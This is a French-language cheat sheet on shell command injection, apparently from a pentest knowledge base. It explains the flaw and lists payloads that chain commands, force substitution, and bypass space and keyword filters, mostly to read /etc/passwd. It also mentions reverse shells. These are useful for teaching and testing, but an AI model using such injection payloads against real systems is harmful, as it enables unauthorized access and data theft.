

<!--- category: cmdinjection --->
<!--- id: intro --->
<!--- title: Injection de commandes Shell --->
<!--- keywords:  --->
## Injection de commandes Shell

L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.

Par exemple: un formulaire permet de saisir son nom et l'afficher.
Le code coté serveur va ressembler à: system ('echo '.$NAME);
Si nous saisissons: YOLO; cat /etc/password;
Le serveur va enchainer les deux commandes en executant system ('echo YOLO; cat /etc/password;'); et nous permettre de récupérer le contenu du fichier passwd.



<!--- category: cmdinjection --->
<!--- id: CommandPrinciple --->
<!--- title: Command Injection: Principe --->
<!--- keywords:  --->
## Command Injection: Principe

L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.

Par exemple: un formulaire permet de saisir son nom et l'afficher.
Le code coté serveur va ressembler à: 
```
system ('echo '.$NAME);
```
 
Si nous saisissons: 
```
YOLO; cat /etc/password;
```
 
Le serveur va enchainer les deux commandes en executant:
```
system ('echo YOLO; cat /etc/password;'); 
```
 
Nous allons récupérer le contenu du fichier passwd.

Avec une injection de commande nous avons la main sur le serveur.
Nous pouvons récupérer des informations sur le serveur (uname -a), recupérer des noms de comptes (cat /etc/passwd), récupérer les fichiers de config du serveur web, lancer un reverse shell...



<!--- category: cmdinjection --->
<!--- id: CommandChainUx --->
<!--- title: Unix: Enchainer deux commandes shell --->
<!--- keywords:  --->
## Unix: Enchainer deux commandes shell

Utiliser les séparateurs de commandes ; && | ||
```
echo YOLO; cat /etc/passwd
echo YOLO && cat /etc/passwd
echo YOLO | cat /etc/passwd
echo YOLO || cat /etc/passwd    Seulement si la première commande est en echec
```
 



<!--- category: cmdinjection --->
<!--- id: CommandEvalUx --->
<!--- title: Unix: Force command execution in a string --->
<!--- keywords:  --->
## Unix: Force command execution in a string

Il est possible de forcer l'execution d'une commande avec ` $ et {
```
echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
```
 



<!--- category: cmdinjection --->
<!--- id: CommandSpaceFilteres --->
<!--- title: Bypass: Les espaces sont filtrés --->
<!--- keywords:  --->
## Bypass: Les espaces sont filtrés

Les développeurs peuvent avoir mis des filtres pour empécher l'execution de commande. Par exemple retirer les espaces. Néanmoins, même sans espaces, il est toujours possible de lancer lancer des commandes:
```
cat&lt;/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```
 



<!--- category: cmdinjection --->
<!--- id: CommandBlacklist --->
<!--- title: Bypass: Certains mot clefs sont filtrés --->
<!--- keywords:  --->
## Bypass: Certains mot clefs sont filtrés

Si un filtre recherche une liste de commandes, il est toujours possible de le contourner: simple quote, double quote, backslash et slash
```
c'a't /etc/passwd
cat /etc/passwd
c\at /etc/passwd
who``ami
```
 
Et si un nom de fichier est filtré, il est possible de multiplier les /
Filtre sur cat et /etc/passwd
```
c\at /etc////////passwd
```
 

